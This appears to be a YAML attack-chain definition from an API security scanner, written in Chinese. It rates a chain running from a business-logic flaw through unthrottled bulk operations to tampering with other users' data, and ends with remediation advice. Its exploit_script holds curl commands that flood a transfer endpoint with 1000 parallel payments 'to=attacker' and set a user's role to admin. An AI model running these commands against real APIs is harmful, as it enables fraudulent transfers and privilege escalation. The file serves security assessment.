id: CHAIN-008
name: "逻辑缺陷 → 批量操作 → 数据篡改"
severity: HIGH
cvss: 7.0
epss: 0.55

steps:
  - step: 1
    name: "业务逻辑缺陷"
    rule: logic_flaw
    description: "API缺少业务逻辑验证"
    condition: "可跳过正常业务流程"

  - step: 2
    name: "批量操作接口"
    rule: bulk_operation
    description: "批量操作无速率限制"
    condition: "支持批量创建/修改/删除"

  - step: 3
    name: "数据篡改"
    rule: data_tampering
    description: "篡改其他用户数据"
    condition: "无对象级别权限检查"

exploit_script: |
  # Step 1: 发现逻辑缺陷
  # 正常流程需要先验证邮箱，但API可直接修改

  # Step 2: 批量操作
  for i in {1..1000}; do
    curl -X POST https://target.com/api/transfer \
      -d "amount=0.01&to=attacker" &
  done

  # Step 3: 篡改数据
  curl -X PUT https://target.com/api/users/123 \
    -d "role=admin"

remediation:
  priority: P1
  effort: "4小时"
  suggestions:
    - "实施对象级别权限检查(IDOR防护)"
    - "批量操作添加速率限制"
    - "关键操作需要二次确认"
